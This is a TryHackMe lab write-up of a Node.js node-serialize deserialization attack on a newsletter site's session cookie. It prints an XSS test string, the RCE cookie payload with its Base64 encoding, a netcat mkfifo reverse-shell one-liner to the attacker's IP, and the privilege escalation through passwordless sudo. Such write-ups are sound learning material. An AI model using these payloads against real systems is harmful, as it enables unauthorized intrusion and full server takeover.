**<p align="center">TryHackMe: Jax Sucks Alot.............</p>**
---

<p align="center">
  <img src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/room%20icon.png" alt="image alt" width="180" />
</p>

[![Day 28 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2028%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)

“In JavaScript everything is a terrible mistake."

**Topic:** Web application pentesting

**Completed:** 8/12/2025

“We are Horror LLC, we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially. We ask that you perform a thorough penetration test and try to compromise the root account. There are no rules for this engagement. Good luck!”

<p align="center">+++++++++</p>

Beginning with an `nmap -sV -sC` scan, I discovered two open TCP ports:
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http
```
Navigating to the HTTP service, I found a website named Horror LLC, featuring a simple input field for visitors to submit their email addresses to receive newsletters.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%201.png)

Inspecting the webpage’s source code revealed an interesting snippet of Node.js JavaScript, potentially exploitable given the room’s hint:
“In JavaScript everything is a terrible mistake.”

The source included a script that set a cookie with a suspicious session value, and submitted the email via a POST request, suggesting some backend logic processing the input.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%202.png)

To check for basic client-side vulnerabilities, I tested the email input field with a common XSS payload:
```
test@example.com"><script>alert('XSS')</script>
```

However, this did not trigger any popup alert or visible script execution, indicating that the input was likely sanitized or not directly rendered.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%203.png)

Using Firefox’s developer tools, I further inspected the page’s behavior during form submission. After submitting a test email address, I monitored the Storage tab and noticed a cookie was set, containing a Base64-encoded JSON string.
This suggested that the application stored some session or user data client-side in an encoded cookie, likely for tracking newsletter signups or sessions.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%204.png)

Noticing the cookie value was Base64 encoded, I decoded it using an online tool. The result was:
```
{"email":"tester@email.com"}
```
This confirmed that the user input was being serialized and stored in the cookie, suggesting that the server likely deserializes this data on the backend, a potential vulnerability point.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%205.png)

To investigate further, I looked into Node.js deserialization exploits and found a payload example on Exploit-db:
```
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```           

Although the original payload included additional code wrapping, I discovered that injecting the function directly into the `email` field was sufficient to trigger code execution. 

This is because the server deserializes the JSON stored in the cookie and specifically processes the `email` property, making extra wrapping unnecessary. Using this simpler form made the exploit more straightforward:

```
{"email":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 4 10.201.113.243')}()"
```

I replaced the `ls` command with a `ping` directed to my local machine to verify if the exploit could cause the server to initiate a callback.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%206.png)

On my local machine, I set up a `tcpdump` listener to capture ICMP ping requests by running:
```
sudo tcpdump -i eth0 icmp
```
This command listens on the `eth0` network interface and filters for ICMP packets, allowing me to observe incoming ping requests from the target server.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%207.png)

Using the crafted exploit payload:
```
{"email":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 4 10.201.113.243')}()"
```

I encoded it using an online Base64 encoder, resulting in the following cookie value:
```
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKFwnY2hpbGRfcHJvY2Vzc1wnKS5leGVjKCdwaW5nIC1jIDEwLjIwMS4xMTMuMjQzJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7fSgpIn0=
```
I then replaced the cookie value with this string in the browser and refreshed the page. This successfully triggered ping requests to my local `tcpdump` listener, confirming the server executes the payload and the vulnerability is exploitable.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%208.png)

Using and modifying the classic PentestMonkey Netcat reverse shell payload:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.113.243 4621 >/tmp/f
```
I set up a Netcat listener on my local machine, listening on port `4621`. I then incorporated this payload into my original exploit, Base64 encoded the entire JSON, and inserted it into the session cookie value field.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%209.png)

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%2010.png)

After refreshing the page to trigger the payload, I successfully received a reverse shell connection through the Netcat listener, landing me in the server’s `/opt/webapp` directory.
To stabilize the shell for easier interaction, I ran the following commands:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%2011.png)

Running `sudo -l` revealed that the user had permission to run **all commands as root without a password**, opening the door to full control of the system!

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%2012.png)

Next, I checked for user accounts on the system with home directories using:
```
cat /etc/passwd | grep “/home”
```
Finding three accounts, the `dylan` user stood out the most. With root access secured, accessing Dylan’s home directory and reading the `user.txt` flag, followed by the root flag, was easy!

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Jax-Sucks-Alot/Images/Screenshot%2013.png)

<p align="center">+</p>

**Lessons Learned**

This challenge was a solid demonstration of how powerful and dangerous deserialization vulnerabilities can be, especially in Node.js applications using `node-serialize`. Even something as simple as a cookie value can be exploited to gain full remote code execution if not properly validated.

It taught the importance of thoroughly inspecting client-side data handling and understanding the backend mechanisms involved. It was a great exercise in combining reconnaissance, creative payload crafting, and practical exploitation to achieve a full compromise.

I had fun learning something new!

<p align="center">+++++++++</p>

🔒 Out of respect for the learning experience, I’ve chosen not to share the flag answers directly. Instead, I’ve documented my full process to support both others and myself in understanding the vulnerability.

**Resources**:
- [TryHackMe's Jason Room](https://tryhackme.com/room/jason)
- [Node.js Explaination](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
- [Exploit-DB](https://www.exploit-db.com/exploits/45265)
- [Online Decoder](https://appdevtools.com/base64-encoder-decoder)
